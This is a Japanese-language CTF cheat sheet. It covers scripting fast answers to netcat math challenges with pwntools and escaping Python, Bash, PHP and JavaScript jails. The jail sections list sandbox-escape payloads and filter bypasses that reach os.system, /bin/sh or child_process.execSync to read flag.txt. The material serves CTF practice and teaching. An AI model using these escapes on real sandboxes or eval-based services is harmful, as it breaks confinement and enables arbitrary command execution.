# PPC & Jail Escape (CTF Jeopardy)

## PPC (Professional Programming Competition)

### 概要
nc接続して大量の計算問題を時間内に解く形式。
手動では不可能→自動化スクリプト必須。

### 典型パターン

#### 数学計算
```python
from pwn import *

r = remote('challenge.ctf', 1337)

while True:
    try:
        line = r.recvline().decode()
        # "What is 123 + 456?" のようなパターン
        if '+' in line:
            nums = re.findall(r'\d+', line)
            ans = int(nums[0]) + int(nums[1])
            r.sendline(str(ans).encode())
    except EOFError:
        print(r.recvall())  # flag出力
        break
```

#### 文字列操作
```python
# "Reverse: hello" → "olleh"
# "Base64: SGVsbG8=" → "Hello"
# "Count 'a' in 'banana'" → "3"
```

#### アルゴリズム
- 素因数分解
- 最大公約数/最小公倍数
- フィボナッチ
- 素数判定
- ソート/検索

### 実装Tips

```python
from pwn import *
import re

def solve_math(expr):
    """安全なeval代替"""
    # 数式として評価（危険な入力は除外済み前提）
    allowed = set('0123456789+-*/() ')
    if all(c in allowed for c in expr):
        return eval(expr)
    return None

r = remote('host', port)

# タイムアウト対策
r.settimeout(1)

# 大量問題ループ
for _ in range(1000):  # 問題数に応じて
    q = r.recvuntil(b'?').decode()
    # パース処理
    answer = solve(q)
    r.sendline(str(answer).encode())

r.interactive()
```

---

## Jail Escape

### 概要
制限されたシェル/インタプリタから脱出してflagを読む。
フィルタリング・サンドボックスの穴を突く。

### Python Jail

#### 基本テクニック
```python
# __builtins__ へのアクセス
[].__class__.__base__.__subclasses__()

# __import__ を見つける
[x for x in ().__class__.__base__.__subclasses__() if 'warning' in str(x)][0]()._module.__builtins__['__import__']('os').system('cat flag.txt')

# eval/exec 経由
eval('__import__("os").system("id")')
```

#### フィルタバイパス
```python
# 'import' がブロックされている場合
__builtins__.__dict__['__imp'+'ort__']('os')

# 'os' がブロックされている場合
__import__('\x6f\x73')  # hex
__import__(chr(111)+chr(115))  # chr

# '.' がブロックされている場合
getattr(__import__('os'), 'system')('id')

# '_' がブロックされている場合
# Unicode normalization
ＯＳ = __import__('os')

# 数字制限
True + True  # = 2
len('aaa')  # = 3
```

#### 高度なテクニック
```python
# breakpoint() (Python 3.7+)
breakpoint()
# → pdb shell が起動 → !cat flag.txt

# help() 経由
help()
# modules → os → !cat flag.txt

# license() 経由（ファイル読み込み）
license._Printer__filenames = ['flag.txt']
license()
```

### Bash Jail

#### 基本テクニック
```bash
# PATHが空の場合
/bin/cat flag.txt

# catがない場合
< flag.txt
head flag.txt
tail flag.txt
less flag.txt
more flag.txt
nl flag.txt
sort flag.txt
uniq flag.txt
grep . flag.txt
awk '{print}' flag.txt
sed '' flag.txt
while read line; do echo $line; done < flag.txt

# 特定文字ブロック
# '/' がブロック → $HOME使用
cd; cat flag.txt

# スペースブロック
cat${IFS}flag.txt
cat<flag.txt
{cat,flag.txt}

# 文字列構築
a=fl;b=ag;cat $a$b.txt
cat $(echo flag.txt)
cat `echo flag.txt`
```

#### 制限シェル脱出
```bash
# rbashの場合
BASH_CMDS[a]=/bin/sh;a

# PATH制限回避
export PATH=/bin:/usr/bin:$PATH
/bin/sh

# vim/vi から
:!/bin/sh
:set shell=/bin/sh
:shell

# less/more から
!/bin/sh

# awk から
awk 'BEGIN {system("/bin/sh")}'
```

### PHP Jail
```php
// 関数名を文字列から構築
$f = 'sys'.'tem';
$f('cat flag.txt');

// call_user_func
call_user_func('system', 'id');

// バッククォート
echo `cat flag.txt`;

// scandir + file_get_contents
print_r(scandir('.'));
echo file_get_contents('flag.txt');
```

### JavaScript Jail
```javascript
// this/global object
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat flag.txt')

// Function constructor
Function('return this')().process.mainModule.require('child_process').execSync('cat flag.txt')

// Reflect
Reflect.get(Reflect.get(this, 'constructor'), 'constructor')('return process')()
```

## Quick Reference

### Python Jail 初動
```python
# 利用可能な関数確認
print(dir(__builtins__))

# subclasses確認
print(().__class__.__base__.__subclasses__())

# 番号で参照
().__class__.__base__.__subclasses__()[X]  # X=有用なクラスのindex
```

### Bash Jail 初動
```bash
# 利用可能コマンド確認
compgen -c
echo $PATH
type cat

# 環境変数確認
env
set
```

## Tips

1. **エラーメッセージを読む**: フィルタの内容がわかる
2. **1文字ずつ試す**: 何がブロックされているか特定
3. **Unicode/エンコード**: 正規化で突破できることも
4. **改行で分割**: コマンドを複数行に
5. **時間差**: sleep使って出力確認
